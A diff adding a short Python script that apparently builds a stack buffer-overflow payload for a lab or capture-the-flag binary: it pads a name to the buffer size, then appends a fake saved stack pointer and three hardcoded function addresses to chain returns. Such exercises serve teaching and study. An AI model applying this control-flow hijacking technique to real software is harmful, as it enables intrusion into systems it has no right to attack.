@@ -1,0 +1,20 @@
+#!/usr/bin/python3
+
+import sys
+
+addr_size = 8
+buff_size = 0xc
+fake_stack = (0x7fffffffd448).to_bytes(addr_size,byteorder='little')
+f_addr = (0x000000000040118a).to_bytes(addr_size,byteorder='little')
+g_addr = (0x0000000000401170).to_bytes(addr_size,byteorder='little')
+h_addr = (0x0000000000401156).to_bytes(addr_size,byteorder='little')
+
+def pad(s, l):
+    b = s.encode()
+    return b + (b'\0' * (l-len(b)))
+
+name = "Pino"
+
+fake = pad(name, buff_size) + fake_stack + f_addr + g_addr + h_addr
+print(len(fake))
+sys.stdout.buffer.write(fake)
